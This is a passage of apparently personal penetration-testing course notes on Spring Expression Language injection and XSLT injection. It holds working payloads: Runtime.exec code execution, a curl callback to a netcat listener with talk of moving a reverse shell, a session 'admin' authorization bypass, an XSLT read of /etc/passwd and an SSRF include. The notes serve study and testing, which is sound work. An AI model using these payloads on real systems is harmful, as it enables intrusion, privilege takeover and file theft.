+</code></pre><p id="99a62f3d-1b4b-4a0a-b4bc-03fe39ac0471" class="">Now we can use the java command, just change the javac to java and remove the .java extension at the end of the program name</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8178947d-6769-405f-90f6-428b490df723" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main
+</code></pre><p id="fae3002c-73f1-460d-ba4f-177658e5650b" class="">Enter a String to evaluate:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0ce28b18-913a-4121-9a98-d078c586027a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{5*5}
+[25]
+</code></pre><h3 id="8d523a5d-7f4e-4fbf-8d23-ac3cd289c74c" class=""><strong>Talking to EL Parser</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#talking-to-el-parser"></a></strong></h3><p id="e937e97c-2ae5-4e0d-a204-e190c37bda11" class="">As the environment is set up, u can start to test the expressions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="792a136d-13fa-4977-bb0a-eb3455b58f53" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{&quot;aaaa&quot;.toString()}
+[aaaa]
+{&quot;bbb&quot;.replace(&quot;b&quot;,&quot;x&quot;)}
+[xxx]
+</code></pre><h3 id="3a8fc7a7-c300-4a5c-bd24-ebd173084341" class=""><strong>Playing with Classes</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#playing-with-classes"></a></strong></h3><p id="0d564d2b-b8f7-4270-ac5b-a313eb995146" class="">In situations where we cannot write plain code:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9889a699-2040-4447-9d44-52bbed468dec" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{&quot;x&quot;.getClass()}
+[class java.lang.String]
+
+{&quot;&quot;.getClass().forName(&quot;java.util.Date&quot;)}
+[class java.util.Date]
+</code></pre><p id="ca2e48eb-b7e9-4de3-b314-38af3c683f31" class="">Enumeate the objects methods:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="df75eb0d-6053-4f9c-a660-cbea2794aaac" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{&quot;&quot;.getClass().forName(&quot;java.util.Date&quot;).getMethods()[0].toString()}
+[public boolean java.util.Date.before(java.util.Date)]
+</code></pre><blockquote id="df42ca4d-33ef-4cba-80fc-fda4b23bc7d7" class="">The first accessible method of java.util = before()</blockquote><ul id="5c378a30-264c-4f82-9181-ad4a090ee3a6" class="bulleted-list"><li style="list-style-type:disc">https://www.javatpoint.com/java-date-before-method</li></ul><ul id="6bb3d89f-8589-439d-8e24-a32dbe6b86b0" class="bulleted-list"><li style="list-style-type:disc">The data package has a before() method that takes a Date object as an argument</li></ul><h3 id="d5df6887-447c-4056-8640-422bf017b750" class=""><strong>EL Code Execution</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#el-code-execution"></a></strong></h3><p id="5f1c48e3-8ec2-4d84-bec0-6fed2b83a2eb" class="">Trying RCE:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e48aae64-8d17-4563-9360-84e04a6c22a2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Java.lang.Runtime.getRuntime().exec(command)
+java.lang.ProcessBuilder(command, argument1, argument2).start()
+</code></pre><p id="5da7d3f0-e437-4fd1-a9db-f62c6bdcc112" class="">getRuntime try:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7aac1303-e2cf-4719-bf68-5d675aa04901" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethods()[6].toString()}
+[public static java.lang.Runtime java.lang.Runtime.getRuntime()]
+</code></pre><p id="84a05566-9f9a-455f-a12b-62bb68aaa010" class="">Invoke the final function:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7aa8a7b5-ce55-4fc0-a059-8e3ac0b1b059" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;id&quot;)}
+[Process[pid=2770, exitValue=0]]
+</code></pre><p id="49b77856-ede8-445d-9a87-b12cb97b8401" class="">In such a scenario, we would rather go For an interactive reverse shell. In this case, we confirm the existence of code execution by issuing curl, as follows:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9e0c925c-738e-41df-b2ce-12821a6d34f9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">{&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;curl http://127.0.0.1/rce&quot;)}
+[Process[pid=2816, exitValue=&quot;not exited&quot;]]
+</code></pre><p id="04cd07bd-7320-4a17-a4f9-9f9bab24a162" class="">The request is received on a netcat listener:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="035bad97-3985-40cd-97af-728574dd0bf9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvnp 80
+</code></pre><p id="0def0699-88a7-4940-b24a-37e698b4c6cb" class="">Curl is very useful, we can transfer files to and from the victim machine</p><blockquote id="2e4f8eac-e6d8-4e4f-a017-3fd2bdc39cd6" class="">So we can move a reverse shell and run it using the template injection RCE vuln</blockquote><h3 id="b510eaff-8daf-4098-8cad-c82c4d2af070" class=""><strong>Extending EL Exploitation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#extending-el-exploitation"></a></strong></h3><p id="73f0cc6d-322a-4c20-8289-471c1bdc1b5f" class="">Server variables usually have universal names - like :</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f12cf57b-be2a-44d8-b7d4-fff2cb7f3fe0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- ${application}
+- ${session}
+- ${request}
+</code></pre><blockquote id="434fe5e3-6b6d-4904-a190-3ba64be8d43d" class="">Burp Intruder can be utilized For injecting these and looking if interesting data is not returned in result (if the object is resolved)</blockquote><p id="06bdfe73-6413-4034-ab91-8fe57c84372b" class="">Some variables names can look like (they are executed in their respective template curly braces):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aa274ae6-2c76-46aa-a169-7ffcadf001ba" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">applicationScope # global application variables
+requestScope # request variables
+initParam # application initialization variables
+sessionScope # session variables
+param.X # parameter value where X is name of a http parameter
+</code></pre><p id="3d58a09a-dbef-4093-accc-ad0f6c29e827" class="">We can retrieve with .toString like that:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="27176528-f240-41a3-8bd6-e11862348769" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">${sessionScope.toString()}
+</code></pre><p id="5df4f26c-1fec-47d9-8147-426b8ce91e3e" class="">Sample authorization bypass might be similar to the below statement:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9a545652-3633-401a-8506-bc9da5623ed6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">${pageContext.request.getSession().setAttribute(&quot;admin&quot;,true)}
+</code></pre><p id="a9988d4d-b5b1-4ef1-8a6d-198c4ac00d09" class="">With burp intruder we can find variables with wordlists (like the follow):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="73a6d145-3a2a-47b1-8948-57d5a398a051" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">${user}
+${password}
+${employee.FirstName}
+</code></pre><p id="2cd43e5a-4209-432f-af8b-1f0b0cdc2cca" class="">Moreover:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ebeb17-c50d-4027-a425-734ef37d7885" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/
+- https://sethjackson.github.io/2018/04/16/el-injection/
+- https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/
+</code></pre><p id="fb33ba12-e051-480b-8a58-c573cc5357ec" class="">lets compile and exploit a simple example of the Spring Expression Language injection</p><h2 id="08528586-96d0-4ae3-8098-56420eb95b95" class=""><strong>XSLT Purpose</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#xslt-purpose"></a></strong></h2><p id="e277ccf6-27d4-4829-aeb7-ca53d19f986d" class="">eXtensible Stylesheet Language Transformations is a language used in XML document transformations</p><blockquote id="49a64790-3113-42d9-8982-32faf9a1ee7c" class="">aka as XSL</blockquote><p id="77dc220e-4211-47b0-884e-c8f4ce2e69ab" class="">The output of the transformation can be anything, but often is another xml or html-type file.</p><ul id="a1df4cd1-17e0-457c-b482-18558555d084" class="bulleted-list"><li style="list-style-type:disc">XSL uses its built-in functions and XPATH language to select and change parts of an XML document</li></ul><h3 id="ee3232f5-43b9-406e-9081-0542d360318e" class=""><strong>XSLT Example</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#xslt-example"></a></strong></h3><figure id="9245325e-f02e-4319-ba35-460d67cb322b" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/63.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/63.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bd053cf2-412a-4d80-9e3a-0e0f3d7b6e71" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;xsl:template-match=&quot;/&quot;&gt; is a directive that means that this stylesheet should apply to any (&quot;/&quot;) xml nodes
+# For any XML structure (&quot;/&quot;), the output will look like the red code.
+</code></pre><figure id="beb858b3-985b-43de-8ab4-3a2645645512" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/64.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/64.png"/></a></figure><p id="9cb9dbce-a6e5-4563-8fec-373adda8cdb4" class="">You can also see other XSL directives. Those two use XPATH, which is a language used to traverse XML documents and find certain values. In this case, we use the value of (starting from the root node):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="242047fe-3ad3-449f-a43f-915925466c1f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Catalog
+  cd
+    title
+</code></pre><figure id="85354a83-ce32-41d1-9eaf-d60938cabea7" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/65.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/65.png"/></a></figure><p id="21a2d3d5-4561-4e87-925d-f4bd3cdaf279" class="">In the end, we receive an HTML table that contains values of the node <strong>title</strong>. Its purposely doubled. Of course, any other element can be imported into the result table.</p><h3 id="b52c2fcb-dc76-4d3a-8aa0-7cef1fc77a27" class=""><strong>Experimenting with XSLT Parser</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#experimenting-with-xslt-parser"></a></strong></h3><p id="9f93bf45-0fda-42ca-a3e9-fa6b0b45bcda" class="">Few well-known XSLT engines:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="474c5a11-d943-4935-88d4-7c86199442cc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Saxon
+- Xalan
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="58abcd8c-5054-45a5-b330-de318a3d6a5f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">apt install default-jdk
+apt install libsaxonb-java
+</code></pre><h3 id="d311ffd2-f770-4d14-9385-d3f64dc0b380" class=""><strong>XSLT Documentation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#xslt-documentation"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="08fee260-f6f9-4e10-99f0-e2ccf6d0fe6d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- https://www.w3.org/TR/xslt-10/
+- https://www.w3.org/TR/xslt20/
+- https://www.w3.org/TR/xslt-30/
+</code></pre><h3 id="9c0ac710-3a6e-46d3-a3f3-4cae3998e531" class=""><strong>XSLT File Read</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#xslt-file-read"></a></strong></h3><p id="97a9acfc-e62d-43c9-92d8-57f8f6a479fa" class="">If we control the XSL file:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="53e67105-0bb2-4747-aa9c-1a940f2ff1f2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">unparsed-text($href as xs:string?) as xs:string?
+unparser-text($href as xs:string?, $encoding as xs:string) as xs:string?
+
+# the &#x27;unparsed-text&#x27; function reads an external resource
+# (For example: a file) and returns its contents as a string
+</code></pre><p id="43d6b04f-777b-490b-8ce4-d289ddcc8d4d" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="79cd89b7-4d19-4a6b-a528-b06bff3b8e40" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;xsl:value-of select=&quot;unparsed-text(&#x27;/etc/passwd&#x27;, &#x27;utf-8&#x27;)&quot;/&gt;
+# the result contains a /etc/passwd file
+</code></pre><figure id="31681901-6a53-4648-8b65-78785ca67b94" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/66.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/66.png"/></a></figure><p id="e3ed8f7a-77a1-4598-8882-f2c177f00d97" class="">XSL:Include is another interesting function, which allows us to join another xsl stylesheet. The downside is, it has to be a valid XSL document. Upside: SSRF is still possible.</p><h3 id="143d4fbe-e6c6-4ced-99e2-39bc6f988df8" class=""><strong>XSLT SSRF</strong><strong><a href="https://johnermac.github.io/notes/ewptx/serverside/#xslt-ssrf"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="91e64f93-5b46-4caa-938b-3cc3e2f550fa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;xsl:include href=&quot;http://127.0.0.1:8080/xslt&quot;/&gt;
